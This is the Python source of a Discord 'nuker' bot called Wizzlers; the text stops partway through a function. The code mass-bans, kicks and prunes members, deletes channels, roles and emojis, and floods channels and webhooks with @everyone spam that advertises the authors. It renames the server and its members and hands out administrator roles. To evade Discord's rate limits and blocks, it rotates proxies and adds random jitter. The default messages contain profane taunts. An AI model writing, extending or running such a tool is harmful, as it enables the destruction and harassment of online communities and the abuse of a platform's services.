import asyncio
import aiohttp
import discord
from discord.ext import commands
from itertools import cycle
import random
import json
import os
import webbrowser
import base64
from datetime import datetime, timedelta
import time
import pyperclip

VERSION = '2.1.4'

__mode__ = None

WIZZLER_START = (75, 0, 130)
WIZZLER_END = (255, 0, 255)
DEADLIZER_START = (51, 0, 0)
DEADLIZER_END = (255, 102, 102)
GREEN_START = (0, 34, 0)
GREEN_END = (0, 255, 0)
RED_START = (51, 0, 0)
RED_END = (255, 102, 102)
PINK_START = (75, 0, 130)
PINK_END = (255, 0, 255)

def gradient_text(text, start_color, end_color, bold=True):
    def rgb_to_256(r, g, b):
        r = round(r / 255 * 5)
        g = round(g / 255 * 5)
        b = round(b / 255 * 5)
        return 16 + (36 * r) + (6 * g) + b

    result = "\033[1m" if bold else ""
    length = len(text)
    for i, char in enumerate(text):
        ratio = i / max(length - 1, 1)
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        color_code = rgb_to_256(r, g, b)
        result += f"\033[38;5;{color_code}m{char}"
    result += "\033[0m"
    return result

def load_tokens():
    """Loads tokens from tokens.txt"""
    try:
        with open("tokens.txt", "r") as f:
            tokens = [line.strip() for line in f if line.strip()]
        if not tokens:
            print(format_log_message("ERROR", "tokens.txt is empty.", 50))
            return []
        print(format_log_message("SUCCESS", f"Loaded {len(tokens)} tokens.", 50))
        return tokens
    except FileNotFoundError:
        print(format_log_message("ERROR", "tokens.txt not found.", 50))
        return []

def get_mode_colors():
    """Get colors based on current mode"""
    if __mode__ == "deadlizer":
        return DEADLIZER_START, DEADLIZER_END
    else:
        return WIZZLER_START, WIZZLER_END

def format_log_message(status, message, padding=50):
    timestamp = f"[{datetime.now():%Y-%m-%d %H:%M:%S}]"
    mode_start, mode_end = get_mode_colors()
    if status == "SUCCESS":
        full_message = f"{timestamp} (+) SUCCESS 【  wizzlersop  】  {message:<{padding}}"
        return gradient_text(full_message, GREEN_START, GREEN_END, bold=True)
    elif status == "ERROR":
        full_message = f"{timestamp} (+) ERROR 【  wizzlersop  】  {message:<{padding}}"
        return gradient_text(full_message, RED_START, RED_END, bold=True)
    else:
        full_message = f"{timestamp} (+) INFO 【  wizzlersop  】  {message:<{padding}} │"
        return gradient_text(full_message, mode_start, mode_end, bold=True)

async def add_jitter_delay(min_delay=0.1, max_delay=0.5):
    delay = random.uniform(min_delay, max_delay)
    await asyncio.sleep(delay)

def switch_to_deadlizer():
    """Switch to Deadlizer mode"""
    global __mode__, __max_concurrent__
    __mode__ = "deadlizer"
    __max_concurrent__ = 100
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("SUCCESS", "Switched to Deadlizer Mode - Concurrent: 2000", 40))
    print(format_log_message("INFO", "TIME TO DESTROY", 40))
    return True

def switch_to_wizzler():
    """Switch to Wizzler mode"""
    global __mode__
    __mode__ = "wizzler"
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("SUCCESS", "Switched to Wizzler Mode", 40))
    print(format_log_message("INFO", "wizzlers op", 40))
    return True

__intents__ = discord.Intents.default()
__intents__.members = True
__client__ = commands.Bot(command_prefix="+", help_command=None, intents=__intents__)

__config__ = None
__loaded_configs__ = {}  
__current_config_name__ = None  
__config_index__ = 0  
config_folder = "configs"

def switch_config(config_name):
    """Switch to a different loaded config"""
    global __config__, __current_config_name__, token, __max_concurrent__
    
    if config_name not in __loaded_configs__:
        print(format_log_message("ERROR", f"Config '{config_name}' not found!", 47))
        return False
    
    __current_config_name__ = config_name
    __config__ = __loaded_configs__[config_name].copy()
    token = __config__["token"]
    __max_concurrent__ = __config__.get("max_concurrent", 70)
    
    if os.name == "nt":
        os.system(f"title Nuker | Max Concurrent: {__max_concurrent__} | Config: {__current_config_name__}")
    
    return True

def load_multiple_configs():
    """Load multiple config files from the configs folder"""
    global __loaded_configs__, __current_config_name__, __config__, token, __max_concurrent__
    
    os.system("cls") if os.name == "nt" else os.system("clear")
    
    if not os.path.exists(config_folder):
        print(format_log_message("ERROR", "'configs' folder not found.", 50))
        os._exit(1)

    config_files = [f for f in os.listdir(config_folder) if f.endswith(".json")]
    if not config_files:
        print(format_log_message("ERROR", "No JSON files found in 'configs' folder.", 50))
        os._exit(1)
    while True:
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Configs:", 50))
        print(gradient_text("╭" + "─" * 70 + "╮", mode_start, mode_end, bold=True))
        for i, config_file in enumerate(config_files, 1):
            print(gradient_text(f"│{i:<2} │ {config_file:<64} │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 70 + "╯", mode_start, mode_end, bold=True))
        print(format_log_message("INFO", "Enter numbers (e.g., 1,2), ranges (1-3), filenames, or 'all'", 30))

        choice_input = input(format_log_message("INFO", "Choose config(s) to load", 50)).strip()
        if not choice_input:
            print(format_log_message("ERROR", "No input provided. Please enter config numbers or 'all'.", 45))
            continue

        choice_lower = choice_input.lower()
        indices = []
        invalid_tokens = []

        if choice_lower == 'all':
            indices = list(range(len(config_files)))
        else:
            tokens = [t.strip() for t in choice_input.split(',') if t.strip()]
            for tok in tokens:
                if '-' in tok and all(p.strip().isdigit() for p in tok.split('-', 1)):
                    try:
                        a_str, b_str = tok.split('-', 1)
                        a = int(a_str.strip()) - 1
                        b = int(b_str.strip()) - 1
                        if a <= b:
                            for idx in range(a, b + 1):
                                if 0 <= idx < len(config_files):
                                    indices.append(idx)
                                else:
                                    invalid_tokens.append(str(idx + 1))
                        else:
                            invalid_tokens.append(tok)
                    except Exception:
                        invalid_tokens.append(tok)
                elif tok.isdigit():
                    idx = int(tok) - 1
                    if 0 <= idx < len(config_files):
                        indices.append(idx)
                    else:
                        invalid_tokens.append(tok)
                else:
                    if tok in config_files:
                        indices.append(config_files.index(tok))
                    else:
                        invalid_tokens.append(tok)

        if invalid_tokens:
            print(format_log_message("ERROR", f"Invalid selections: {', '.join(invalid_tokens)}. Please try again.", 60))
            continue

        seen = set()
        final_indices = []
        for i in indices:
            if i not in seen and 0 <= i < len(config_files):
                final_indices.append(i)
                seen.add(i)

        if not final_indices:
            print(format_log_message("ERROR", "No valid configs selected. Please try again.", 50))
            continue

        for idx in final_indices:
            config_path = os.path.join(config_folder, config_files[idx])
            try:
                loaded_config = json.load(open(config_path, "r", encoding="utf-8"))
                __loaded_configs__[config_files[idx]] = loaded_config
                print(format_log_message("SUCCESS", f"Loaded {gradient_text(config_files[idx], GREEN_START, GREEN_END, bold=True)}", 52))
            except json.JSONDecodeError as e:
                print(format_log_message("ERROR", f"Invalid JSON in {config_files[idx]}: {str(e)}", 30))
            except Exception as e:
                print(format_log_message("ERROR", f"Error loading {config_files[idx]}: {str(e)}", 35))

        if not __loaded_configs__:
            print(format_log_message("ERROR", "No valid configs loaded! Please correct files and try again.", 43))
            continue

        __current_config_name__ = list(__loaded_configs__.keys())[0]
        __config__ = __loaded_configs__[__current_config_name__].copy()
        token = __config__["token"]
        __max_concurrent__ = __config__.get("max_concurrent", 50)
        print(format_log_message("SUCCESS", f"Active config: {gradient_text(__current_config_name__, GREEN_START, GREEN_END, bold=True)}", 45))
        break

os.system("cls") if os.name == "nt" else os.system("clear")

print(format_log_message("INFO", "Select Mode:", 50))
print(gradient_text("╭" + "─" * 60 + "╮", WIZZLER_START, WIZZLER_END, bold=True))
print(gradient_text("│ [1] Wizzler        - Standard Mode                         │", WIZZLER_START, WIZZLER_END, bold=True))
print(gradient_text("│ [2] Deadlizer      - Extreme Mode                          │", DEADLIZER_START, DEADLIZER_END, bold=True))
print(gradient_text("╰" + "─" * 60 + "╯", DEADLIZER_START, DEADLIZER_END, bold=True))

mode_choice = input(format_log_message("INFO", "Choose mode (1-2)", 50)).strip().lower()

if mode_choice == "2":
    __mode__ = "deadlizer"
    __max_concurrent__ = 100  
    print(format_log_message("SUCCESS", "Deadlizer Mode Activated", 40))
else:
    __mode__ = "wizzler"
    print(format_log_message("SUCCESS", "Wizzler Mode Activated", 40))

os.system("cls") if os.name == "nt" else os.system("clear")

try:
    print(format_log_message("INFO", "Load config file or manual input? [c/m]", 50))
    config_choice = input().strip().lower()

    if config_choice == 'm':
        token = input(format_log_message("INFO", "Enter bot token", 50)).strip()
        if not token:
            print(format_log_message("ERROR", "Token is required!", 47))
            os._exit(1)
        max_concurrent = input(format_log_message("INFO", "Enter max concurrent tasks (default 200)", 50)).strip()
        max_concurrent = int(max_concurrent) if max_concurrent.isdigit() else 200
        use_proxy = input(format_log_message("INFO", "Use proxies? [y/n]", 50)).strip().lower() == 'y'
        __config__ = {
            "token": token,
            "max_concurrent": max_concurrent,
            "proxy": use_proxy,
            "nuke": {
                "channel_names": ["nuked by wizzlers", "wizzed by wizzlers", "fucked by wizzlerd"],
                "roles_name": ["stfu wizzlers run you", "wizzlers owns you", "wizzlers fucked your ass"],
                "messages_content": ["@everyone @here Nuked by wizzlers join https://discord.gg/wizzlers and subscribe  https://youtube.com/@hatedshakti https://youtube.com/@wizzlersop ", "@everyone @here wizzlers wizzed you join https://discord.gg/wizzlers and subscribe  https://youtube.com/@hatedshakti https://youtube.com/@wizzlersop ", "@everyone @here destroyed by wizzlers join https://discord.gg/wizzlers and subscribe  https://youtube.com/@hatedshakti https://youtube.com/@wizzlersop "],
                "delete_all_channels": True
            },
            "nuke_all": {
                "ban_members": True,
                "delete_channels": True,
                "delete_roles": True,
                "delete_emojis": True,
                "change_guild_name": True,
                "create_channels": True,
                "create_roles": True,
                "spam_webhooks": True,
                "prune_members": True
            },
            "operations": {
                "ban_reason": "Nuked by Wizzlers",
                "nick_users_to": "Wizzed by wizzlers",
                "dm_message": "@everyone Wizzlers wizzed This Server! join discord.gg/wizzlers",
                "spam_message": "@everyone @here Wizzed by Wizzlers join discord.gg/wizzlers",
                "guild_name": "Wizzed By Wizzlers",
                "guild_icon": "",
                "channel_type": 0,
                "enable_auto_admin": True,            
                "webhooks": {
                    "name": "Wizzlers op",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1437370588959215676/1438890262226272328/a_93725bc317399aff4044d62044a31c66.gif?ex=6918867b&is=691734fb&hm=b5740fb3cbba9ad01e9d068338704b9f42bd11e25f0eae01fdf8d3f2de8604207",
                    "messages": [
                        "@everyone @here shakti x raj wizzed your ass wizzlers on top https://discord.gg/M45m45MaHY",
                        "@everyone @here shakti x raj owns you all wizzlers on top https://discord.gg/M45m45MaHY",
                        "@everyone @here shakti x raj fucked you all wizzlers on top https://discord.gg/M45m45MaHY"
                    ]
                },
                "emoji_rename_to": "Wizzed",
                "mass_report_count":10
            }
        }
        __loaded_configs__["manual"] = __config__.copy()
        __current_config_name__ = "manual"
        __max_concurrent__ = max_concurrent
        print(format_log_message("SUCCESS", "Manual configuration loaded", 33))

        os.system("cls") if os.name == "nt" else os.system("clear")
    else:
        load_multiple_configs()
        os.system("cls") if os.name == "nt" else os.system("clear")
except KeyboardInterrupt:
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("INFO", "Closing Nuker... Goodbye!", 40))
    exit(0)

token = __config__["token"]
__max_concurrent__ = __config__.get("max_concurrent", 50)

os.system("cls") if os.name == "nt" else os.system("clear")

console_width = 140

class shakti:
    def __init__(self, guildid, client):
        self.guildid = guildid
        self.guild = None
        self.client = client
        self.has_proxies = False
        self.proxy_count = 0
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = f.read().splitlines()
            if not proxy_list:
                print(format_log_message("ERROR", "proxies.txt is empty. Disabling proxies.", 28))
            else:
                valid_proxies = []
                for proxy in proxy_list:
                    proxy = proxy.strip()
                    if proxy and ":" in proxy:
                        host, port = proxy.rsplit(":", 1)
                        if port.isdigit():
                            valid_proxies.append(proxy)
                        else:
                            print(format_log_message("ERROR", f"Invalid proxy port in '{gradient_text(proxy, PINK_START, PINK_END, bold=True)}'. Skipping.", 19))
                    else:
                        print(format_log_message("ERROR", f"Invalid proxy format: '{gradient_text(proxy, PINK_START, PINK_END, bold=True)}'. Skipping.", 16))
                if not valid_proxies:
                    print(format_log_message("ERROR", "No valid proxies found. Disabling proxies.", 23))
                else:
                    self.proxy_cycle = cycle(valid_proxies)
                    self.has_proxies = True
                    self.proxy_count = len(valid_proxies)
                    print(format_log_message("SUCCESS", f"Loaded {gradient_text(str(len(valid_proxies)), GREEN_START, GREEN_END, bold=True)} valid proxies for rotation.", 17))
        except FileNotFoundError:
            print(format_log_message("ERROR", "proxies.txt not found. Disabling proxies.", 24))
        except Exception as e:
            print(format_log_message("ERROR", f"Error reading proxies: {str(e)}", 15))

        self.version = cycle(['v10'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.semaphore = asyncio.Semaphore(__max_concurrent__)
        self.session = None 

        self.whitelist_file = "configs/whitelist.txt"
        self.whitelist = self._load_whitelist()
        print(format_log_message("SUCCESS", f"Loaded {gradient_text(str(len(self.whitelist)), GREEN_START, GREEN_END, bold=True)} whitelisted members.", 22))

    def _load_whitelist(self):
        try:
            if not os.path.exists(self.whitelist_file):
                return set()
            with open(self.whitelist_file, "r") as f:
                return set(line.strip() for line in f if line.strip() and line.strip().isdigit())
        except Exception:
            return set()

    def _save_whitelist(self):
        try:
            os.makedirs(os.path.dirname(self.whitelist_file) or 'configs', exist_ok=True)
            with open(self.whitelist_file, "w") as f:
                f.write('\n'.join(sorted(list(self.whitelist))))
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to save whitelist: {e}", 36))

    async def add_to_whitelist(self, user_id):
        user_id = user_id.strip()
        if not user_id.isdigit():
            print(format_log_message("ERROR", f"Invalid User ID: {user_id}", 40))
            return False
        if user_id in self.whitelist:
            print(format_log_message("INFO", f"User {user_id} already whitelisted", 40))
            return False
        self.whitelist.add(user_id)
        self._save_whitelist()
        print(format_log_message("SUCCESS", f"Whitelisted User ID: {user_id}", 40))
        return True

    async def remove_from_whitelist(self, user_id):
        user_id = user_id.strip()
        if user_id in self.whitelist:
            self.whitelist.remove(user_id)
            self._save_whitelist()
            print(format_log_message("SUCCESS", f"Removed User ID: {user_id} from whitelist", 35))
            return True
        print(format_log_message("ERROR", f"User {user_id} not found in whitelist", 40))
        return False

    async def async_input(self, prompt: str):
        """Async input with debug shortcuts: press d+enter to switch modes, Ctrl+C to close"""
        try:
            user_input = await self.client.loop.run_in_executor(None, lambda: input(prompt))
            if user_input.lower().strip() in ['d','dd','ddd', 'dddd', 'ddddd', 'dddddd', 'd' * 7]:
                if __mode__ == "wizzler":
                    switch_to_deadlizer()
                else:
                    switch_to_wizzler()
                return "MODE_SWITCHED"
            return user_input
        except KeyboardInterrupt:
            os.system("cls") if os.name == "nt" else os.system("clear")
            print(format_log_message("INFO", "Closing Nuker... Goodbye!", 40))
            await asyncio.sleep(0.5)
            exit(0)

    async def _get_session(self):
        """Creates and returns a persistent aiohttp.ClientSession."""
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(limit=50, ssl=False),
                timeout=aiohttp.ClientTimeout(total=10)
            )
        return self.session

    def _get_proxy(self):
        """Returns a proxy URL for the next request, or None."""
        if __config__.get("proxy") and self.has_proxies:
            proxy_host = next(self.proxy_cycle)
            return f"http://{proxy_host}"
        return None

    async def execute_ban(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Ban)", 41))
            return True

        async with self.semaphore:
            await add_jitter_delay(0.01, 0.05)
            ban_reason = __config__.get("operations", {}).get("ban_reason", "Nuked by Wizzlers")
            payload = {"delete_message_days": random.randint(0, 7), "audit_log_reason": ban_reason}
            try:
                session = await self._get_session()
                async with session.put(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{member}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Banned {member}", 52))
                            self.banned.append(member)
                            return True
                        elif response.status == 429:
                            await asyncio.sleep(2)
                            return await self.execute_ban(member, token)
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        elif "Max number of bans" in await response.text():
                            print(format_log_message("ERROR", "Max bans exceeded", 47))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to ban {member}", 46))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to ban {member} | {e}", 46))
                return False

    async def execute_kick(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Kick)", 41))
            return True

        async with self.semaphore:
            await add_jitter_delay(0.01, 0.05)
            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Kicked {member}", 52))
                            self.kicked.append(member)
                            return True
                        elif response.status == 429:
                            await asyncio.sleep(2)
                            return await self.execute_kick(member, token)
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to kick {member}", 46))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to kick {member} | {e}", 46))
                return False

    async def execute_prune(self, days: int, token: str):
        async with self.semaphore:
            try:
                session = await self._get_session()
                payload = {"days": days}
                async with session.post(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/prune",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            pruned = (await response.json()).get('pruned', 0)
                            print(format_log_message("SUCCESS", f"Pruned {pruned} members", 43))
                            return pruned
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", "Missing Permissions for pruning", 35))
                        elif response.status == 429:
                            pass
                        elif "Max number of prune" in await response.text():
                            print(format_log_message("ERROR", "Max prune reached", 46))
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                        else:
                            print(format_log_message("ERROR", "Failed to prune members", 41))
                        return 0
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to prune members | {e}", 41))
                return 0

    async def execute_crechannels(self, channelsname: str, type_: int, token: str):
        async with self.semaphore:
            payload = {"type": type_, "name": channelsname.replace(" ", "-"), "permission_overwrites": []}
            try:
                session = await self._get_session()
                async with session.post(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 201:
                            channel_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created channel ID {channel_id}", 42))
                            self.channels.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for #{payload['name']}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create #{payload['name']}", 40))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create #{payload['name']} | {e}", 40))
                return False

    async def execute_creroles(self, rolesname: str, token: str):
        async with self.semaphore:
            colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
            payload = {"name": rolesname, "color": colors}
            try:
                session = await self._get_session()
                async with session.post(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            role_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created role ID {role_id}", 45))
                            self.roles.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for @{rolesname}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create @{rolesname}", 40))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create @{rolesname} | {e}", 40))
                return False

    async def execute_delchannels(self, channel: str, token: str):
        async with self.semaphore:
            await add_jitter_delay(0.01, 0.05)
            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/channels/{channel}",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Deleted channel {channel}", 42))
                            self.channels.append(channel)
                            return True
                        elif response.status == 429:
                            await asyncio.sleep(2)
                            return await self.execute_delchannels(channel, token)
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {channel}", 44))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to delete {channel} | {e}", 44))
                return False

    async def execute_delroles(self, role: str, token: str):
        async with self.semaphore:
            await add_jitter_delay(1, 1.5)
            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles/{role}",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 204:
                            print(format_log_message("SUCCESS", f"Deleted role {role}", 45))
                            self.roles.append(role)
                            return True
                        elif response.status == 429:
                            retry_after = (await response.json()).get('retry_after', 2)
                            await asyncio.sleep(retry_after)
                            return await self.execute_delroles(role, token) 
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for role {role}", 35))
                            return False
                        else:
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to delete role {role} | {e}", 40))
                return False

    async def execute_delemojis(self, emoji: str, token: str):
        async with self.semaphore:
            await add_jitter_delay(0.01, 0.05)
            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis/{emoji}",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 204:
                            print(format_log_message("SUCCESS", f"Deleted emoji {emoji}", 45))
                            self.emojis.append(emoji)
                            return True
                        elif response.status == 429:
                            await asyncio.sleep(2)
                            return await self.execute_delemojis(emoji, token)
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {emoji}", 35))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {emoji}", 44))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to delete {emoji} | {e}", 44))
                return False

    async def execute_massping(self, channel: str, content: str, token: str):
        async with self.semaphore:
            if not content:
                content = __config__.get("operations", {}).get("spam_message", "@everyone @here Server nuked by Wizzlers!")
            payload = {"content": content}
            try:
                session = await self._get_session()
                async with session.post(
                    f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Spammed in {channel}", 47))
                            self.messages.append(channel)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to spam in {channel}", 42))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to spam in {channel} | {e}", 42))
                return False

    async def execute_nick_all(self, member: str, new_nick: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Nick)", 41))
            return True

        async with self.semaphore:
            nick_name = __config__.get("operations", {}).get("nick_users_to", "Wizzled")
            payload = {"nick": nick_name}
            try:
                session = await self._get_session()
                async with session.patch(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Changed nickname for {member}", 39))
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to nick {member}", 46))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to nick {member} | {e}", 46))
                return False

    async def execute_change_icon(self, token: str):
        if not os.path.exists("Guild-Icon"):
            print(format_log_message("ERROR", "Guild-Icon folder not found!", 38))
            return False
        images = [f for f in os.listdir("Guild-Icon") if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp'))]
        if not images:
            print(format_log_message("ERROR", "No images in Guild-Icon folder!", 36))
            return False
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Icons:", 50))
        print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
        for i, img in enumerate(images, 1):
            print(gradient_text(f"│ {i:<2} │ {img:<56} │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))
        try:
            choice_input = await self.async_input(format_log_message("INFO", "Choose icon number", 50))
            choice = int(choice_input.strip()) - 1
            if 0 <= choice < len(images):
                img_path = os.path.join("Guild-Icon", images[choice])
                with open(img_path, "rb") as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                ext = images[choice].split('.')[-1]
                payload = {"icon": f"data:image/{ext};base64,{img_data}"}
                async with self.semaphore:
                    session = await self._get_session()
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                            if response.status in [200, 204]:
                                print(format_log_message("SUCCESS", "Changed guild icon", 42))
                                return True
                            else:
                                print(format_log_message("ERROR", "Failed to change guild icon", 38))
                                return False
            else:
                print(format_log_message("ERROR", f"Invalid choice: {gradient_text(choice_input, PINK_START, PINK_END, bold=True)}!", 47))
                return False
        except ValueError:
            print(format_log_message("ERROR", f"Invalid input: {gradient_text(choice_input, PINK_START, PINK_END, bold=True)}!", 49))
            return False

    async def execute_change_guild_info(self, token: str, new_name: str = None, new_desc: str = None):
        if new_name is None:
            default_name = __config__.get("operations", {}).get("guild_name", "Nuked By Shakti")
            new_name = await self.async_input(format_log_message("INFO", f"New guild name (default: {default_name})", 50))
            new_name = new_name.strip()
            if not new_name:
                new_name = default_name
        
        if new_desc is None:
            new_desc = await self.async_input(format_log_message("INFO", "New guild description", 50))
            new_desc = new_desc.strip()

        if not new_name:
            print(format_log_message("ERROR", "Name required!", 48))
            return False
        
        payload = {"name": new_name}
        if new_desc:
            payload["description"] = new_desc
        
        async with self.semaphore:
            session = await self._get_session()
            async with session.patch(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
            ) as response:
                    if response.status in [200, 204]:
                        print(format_log_message("SUCCESS", f"Guild updated: {gradient_text(new_name, PINK_START, PINK_END, bold=True)}", 43))
                        return True
                    else:
                        print(format_log_message("ERROR", "Failed to update guild", 42))
                        return False

    async def execute_give_admin(self, token: str):
        try:
            session = await self._get_session()
            await add_jitter_delay(0.01, 0.05)
            admin_role_payload = {"name": "Admin", "color": 0xFF0000, "permissions": "8"}
            
            async with session.post(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                headers={"Authorization": f"Bot {token}"}, json=admin_role_payload, proxy=self._get_proxy()
            ) as role_resp:
                if role_resp.status == 429:
                    await asyncio.sleep(2)
                    return await self.execute_give_admin(token)
                if role_resp.status != 200:
                    print(format_log_message("ERROR", "Failed to create admin role", 36))
                    return (0, 0)
                admin_role_id = (await role_resp.json())['id']
                print(format_log_message("SUCCESS", f"Created admin role #{admin_role_id}", 39))
                
            user_input = await self.async_input(format_log_message("INFO", "User IDs (comma-separated) or 'all'", 50))
            user_input = user_input.strip()
            users_to_admin = []
            
            if user_input.lower() == 'all':
                async with session.get(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members?limit=1000",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                ) as members_resp:
                    if members_resp.status == 429:
                        await asyncio.sleep(2)
                        return await self.execute_give_admin(token)
                    if members_resp.status != 200:
                        print(format_log_message("ERROR", "Failed to fetch members", 40))
                        return (0, 0)
                    members = await members_resp.json()
                    users_to_admin = [member['user']['id'] for member in members if member['user']['id'] not in self.whitelist]
                    print(format_log_message("SUCCESS", f"Fetched {len(users_to_admin)} non-whitelisted members", 40))
